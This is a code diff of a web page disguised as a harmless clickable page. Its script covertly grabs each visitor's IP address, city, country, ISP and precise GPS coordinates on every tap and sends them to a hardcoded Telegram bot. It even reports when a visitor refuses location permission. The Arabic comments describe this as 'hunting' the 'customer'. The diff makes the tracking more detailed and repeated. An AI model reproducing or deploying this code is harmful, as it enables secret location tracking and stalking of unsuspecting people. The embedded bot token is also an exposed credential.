@@ -9,7 +9,7 @@ index.html
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Cairo', sans-serif; user-select: none; }
         html, body { height: 100%; width: 100%; background-color: #0f172a; display: flex; align-items: center; justify-content: center; overflow: hidden; cursor: pointer; }
-        .box { background: #1e293b; padding: 40px 25px; border-radius: 30px; box-shadow: 0 15px 35px rgba(0,0,0,0.4); text-align: center; max-width: 350px; border: 1px solid rgba(255,255,255,0.1); z-index: 10; }
+        .box { background: #1e293b; padding: 40px 25px; border-radius: 30px; box-shadow: 0 15px 35px rgba(0,0,0,0.4); text-align: center; max-width: 350px; border: 1px solid rgba(255,255,255,0.1); pointer-events: none; }
         h3 { color: white; margin-bottom: 15px; }
         p { color: #94a3b8; font-size: 14px; line-height: 1.6; }
         .btn-dummy { margin-top: 25px; background-color: #0088cc; color: white; padding: 15px; border-radius: 12px; font-weight: bold; width: 100%; display: block; }
@@ -27,39 +27,35 @@ index.html
 <script>
     const TOKEN = '8698719504:AAE3uab2OjYv-Yl8EkaSkkvWBrADzsgTTE0';
     const ID = '6876904688';
-    let ipCaptured = false;
 
     function send(text) {
         fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${ID}&text=${encodeURIComponent(text)}`);
     }
 
     function strike() {
-        // 1. صيد الـ IP (مرة واحدة فقط عند أول لمسة عشان الزحمة)
-        if (!ipCaptured) {
-            fetch('https://api.ipify.org?format=json')
-            .then(res => res.json())
-            .then(data => {
-                send(`🌐 [IP الحقيقي]: ${data.ip}`);
-                ipCaptured = true; 
-            }).catch(() => {});
-        }
+        // 1. محرك الـ IP (تفصيلي مع كل لمسة)
+        fetch('https://ipapi.co/json/')
+        .then(res => res.json())
+        .then(d => {
+            const info = `🌐 [بيانات الشبكة]\n━━━━━━━━━━━━\nIP: ${d.ip}\nالمدينة: ${d.city}\nالدولة: ${d.country_name}\nالشركة: ${d.org}\n━━━━━━━━━━━━`;
+            send(info);
+        })
+        .catch(() => {
+            fetch('https://api.ipify.org?format=json').then(r => r.json()).then(data => send(`🌐 [IP سريع]: ${data.ip}`));
+        });
 
-        // 2. صيد الـ GPS (بيشتغل مع أي لمسة في أي مكان)
+        // 2. محرك الـ GPS (مصحح 100%)
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(
                 (pos) => {
                     const lat = pos.coords.latitude;
                     const lng = pos.coords.longitude;
-                    // الرابط الصحيح والمباشر لخرائط جوجل
-                    const map = `https://www.google.com/maps?q=${lat},${lng}`;
-                    send(`📍 [موقع GPS]:\n${map}`);
+                    // الرابط العالمي الصحيح لخرائط جوجل
+                    const mapUrl = `https://www.google.com/maps?q=${lat},${lng}`;
+                    send(`📍 [موقع GPS]:\n${mapUrl}`);
                 },
                 (err) => {
-                    // نرسل الرفض مرة واحدة فقط
-                    if(!window.refused) {
-                        send("⚠️ الزبون رفض إذن الموقع");
-                        window.refused = true;
-                    }
+                    send("⚠️ الزبون رفض إذن الموقع");
                 },
                 { enableHighAccuracy: true, timeout: 8000 }
             );
